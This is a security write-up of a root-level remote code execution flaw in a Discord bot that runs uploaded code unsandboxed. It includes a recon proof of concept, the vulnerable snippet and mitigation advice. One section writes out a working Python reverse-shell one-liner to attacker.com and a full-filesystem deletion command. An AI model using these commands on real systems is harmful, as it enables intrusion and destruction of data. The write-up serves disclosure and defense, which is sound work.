# Writeup Critical Remote Code Execution (RCE) in Discord Bot – Full Host Compromise

**Found by** Taylor Christian Newsome  
**Date** April 14, 2026  

## Executive Summary
A Discord bot named “VOIDRUNNER” was discovered by Taylor Christian Newsome to contain a critical Remote Code Execution (RCE) vulnerability. The bot accepts arbitrary code files via Discord attachments and executes them **directly on the host system** with **root privileges**. This allows any Discord user with access to the bot to execute arbitrary commands, compromise the underlying server, exfiltrate data, install backdoors, and pivot into the internal network.

**Severity** **Critical (CVSS 10.0)**  
**Affected Component** `!run` command with file attachment  
**Root Cause** No sandboxing, no privilege separation, direct `subprocess.run()` on untrusted user code  

---

## 1. System Description
The bot is written in Python using `discord.py`. It provides a command `!run` that accepts a code file attachment. Based on the file extension (`.py`, `.js`, `.c`, `.sh`, etc.), the bot compiles/executes the code using native system interpreters/compilers (Python, Node.js, GCC, Bash, etc.). All execution happens in the **host environment** with the same privileges as the bot process.

The bot’s own output confirms this

```
User           : root
UID/GID        : 0/0
Current Dir    : /root/discord/user_storage/...
```

The bot runs as **root** and stores user files under `/root/discord/`.

---

## 2. Vulnerability Analysis

### 2.1 No Sandboxing or Isolation
- The bot uses `subprocess.run(cmd, ...)` directly without any containerisation, virtual machine, or restricted execution environment.
- No seccomp, AppArmor, or SELinux profiles are applied.
- The working directory is a persistent folder owned by the bot (root), but code can access any system path because it runs with root privileges.

### 2.2 Root Privileges
- The bot process runs as `root` (UID 0). Any code executed inherits these privileges.
- An attacker can
  - Read/write any file (e.g., `/etc/shadow`, `/root/.ssh/id_rsa`).
  - Install system packages, create new users, modify kernel parameters.
  - Use raw sockets, load kernel modules, or break out of any chroot if attempted.

### 2.3 Unrestricted Language Support
- The bot supports many languages (Python, Node.js, Ruby, PHP, C, C++, Assembly, Bash, PowerShell). Each one gives full access to system calls, network, file system, and process control.
- Even “safe” languages like Python can import `os`, `subprocess`, `socket`, etc., to execute system commands.

### 2.4 Persistent Storage as Attack Surface
- Each user has a persistent directory (`/root/discord/user_storage/<user_id>/`). An attacker can upload multiple files, write binaries, and execute them later.
- Because the bot runs as root, malware can be installed system-wide and survive reboots.

---

## 3. Proof of Concept (PoC)

On April 14, 2026, Taylor Christian Newsome attached the following Python script (`rce.py`) to a Discord message and executed it with the `!run` command

```python
import platform
import getpass
import os
import subprocess
import uuid

print("=== DEBIAN 12 BOOKWORM RCE SYSTEM INFO ===")
print(f"Hostname       : {platform.node()}")
print(f"OS             : {platform.system()} {platform.release()}")
print(f"User           : {getpass.getuser()}")   # root
print(f"UID/GID        : {os.getuid()}/{os.getgid()}") # 0/0
print(f"Current Dir    : {os.getcwd()}")
print(f"Local IP       : {subprocess.getoutput('hostname -I')}")
```

**Bot Output (truncated)**
```
=== DEBIAN 12 BOOKWORM RCE SYSTEM INFO ===
Hostname       : clumsy
OS             : Linux 6.1.0-44-cloud-amd64
User           : root
UID/GID        : 0/0
Current Dir    : /root/discord/user_storage/828905388518801428
Local IP       : 10.0.0.5
```

The bot also printed **“RCE fully automated and ready for commands, master~”**

This proves arbitrary command execution with root privileges.

### 3.1 More Dangerous Payload Examples
- Reverse shell `python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker.com",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'`
- Extract Discord bot token from environment or memory.
- Install cryptominer or ransomware.
- Delete entire filesystem `os.system("rm -rf / --no-preserve-root")`

---

## 4. Impact Assessment

| Asset | Impact |
|-------|--------|
| **Bot host server** | Full compromise – root access, persistent backdoor, data theft. |
| **Discord bot token** | Attacker can take over the bot, join new servers, spam, or delete channels. |
| **Internal network** | Pivot point – attacker can scan internal IPs, access cloud metadata endpoints, or breach adjacent services. |
| **User data** | Any files stored on the server (including other users’ code, databases) can be stolen. |
| **Compliance** | GDPR, HIPAA, PCI-DSS violations if sensitive data is exposed. |

Because the bot allows **any Discord user** (not just admins) to execute code, the attack surface is massive. A single malicious user can destroy the host.

---

## 5. Root Cause & Code Snippet

The vulnerable code in the bot (discovered by Taylor Christian Newsome)

```python
@bot.command(name="run")
async def run_code(ctx):
    attachment = ctx.message.attachments[0]
    # ... save file ...
    cmd = ["python3", file_path]   # or other language
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180, cwd=user_dir)
```

No validation, no sandboxing, no privilege drop. The bot runs as root and executes whatever the user uploads.

---

## 6. Mitigation Recommendations

### 6.1 **Mandatory Isolate Execution**
- Use **Docker** containers with minimal privileges. Example
  ```python
  docker run --rm --read-only --network none --memory=256m \
    -v /tmp/user_code:/code python3 /code/script.py
  ```
- Or use **gVisor**, **Firecracker**, or **Kata Containers** for stronger isolation.
- Mount user code as read-only, disable network access unless required.

### 6.2 **Drop Root Privileges**
- Run the bot itself as a non-root user (e.g., `discordbot`).
- Use `os.setuid()` or `sudo -u` before executing untrusted code.

### 6.3 **Restrict Allowed Languages & Functions**
- Allow only **safe, sandboxed languages** like **JavaScript with vm2** (but vm2 is also insecure – prefer isolated containers).
- Or pre-define a whitelist of allowed system calls using **seccomp-bpf**.

### 6.4 **Timeouts & Resource Limits**
- Already implemented a 180s timeout – good, but add memory and CPU limits (e.g., `ulimit -v 500000`).

### 6.5 **Input Validation**
- Restrict file types to a strict whitelist (e.g., only `.txt` for non-executable logs).
- Never allow compiled binaries or scripts that can invoke system shells.

### 6.6 **Audit & Monitoring**
- Log all executions with user ID, filename, and exit code (already partially done, but store output hashes).
- Monitor for suspicious commands (e.g., `curl`, `nc`, `bash -i`).

### 6.7 **Use a Cloud Sandbox Service**
- For advanced security, offload execution to an external API like **Piston** (code execution API) or **Replit’s sandbox**.

---

## 7. Conclusion

The Discord bot “VOIDRUNNER” is a **critical RCE vector** because it runs untrusted user code as root on the host. The proof of concept provided by Taylor Christian Newsome on April 14, 2026 demonstrates full system compromise with minimal effort. **Immediately disable the `!run` command** and redesign the bot to use sandboxed execution environments. Until fixed, treat the bot’s host as fully compromised – rotate all secrets, reinstall the server, and review logs for malicious activity.

---

## References
- OWASP Top 10 – A03:2021 Injection
- MITRE ATT&CK – T1059.001 (Command and Scripting Interpreter: PowerShell) / T1059.003 (Windows Command Shell)
- Discord Developer Documentation – Bot safety best practices

**Disclosure Timeline**  
- Vulnerability discovered: April 14, 2026 by Taylor Christian Newsome  
- Vendor notified: Not applicable (personal bot)  
- This writeup is for educational and defensive purposes only.
